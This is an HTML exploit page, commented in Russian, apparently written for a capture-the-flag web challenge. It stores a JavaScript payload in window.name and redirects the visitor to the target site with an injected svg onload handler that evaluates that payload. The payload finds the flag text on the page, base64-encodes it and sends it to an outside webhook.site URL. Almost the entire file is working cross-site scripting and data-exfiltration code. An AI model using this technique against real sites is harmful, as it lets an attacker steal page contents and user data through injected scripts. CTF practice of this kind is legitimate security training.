<!DOCTYPE html>
<html>
<head>
    <title>Exploit Fix</title>
</head>
<body>
    <h3>Redirecting to exploit...</h3>
    <script>
        // 1. Пейлоад.
        // Обратите внимание: мы используем window.name для хранения кода.
        window.name = `
            try {
                // Ищем текст флага
                window.find('p_ctf');
                
                // Получаем выделение
                var sel = window.getSelection().anchorNode.textContent;
                
                // Отправляем (добавил btoa для безопасности кодировки)
                fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?flag=' + btoa(sel));
            } catch(e) {
                fetch('https://webhook.site/2d1d3b3f-1a4a-4d54-9e84-a99d6ee7aa44?error=' + e.message);
            }
        `;

        // 2. Целевая ссылка.
        // ВАЖНО: заменили eval(name) на eval(self.name)
        // self.name всегда указывает на хранилище window.name
        var target = "https://shadow-fight.ctf.prgy.in/?name=%3Csvg/onload=eval(self.name)%3E&avatar=https://picsum.photos/100";

        // 3. Редирект
        window.location.href = target;
    </script>
</body>
</html>
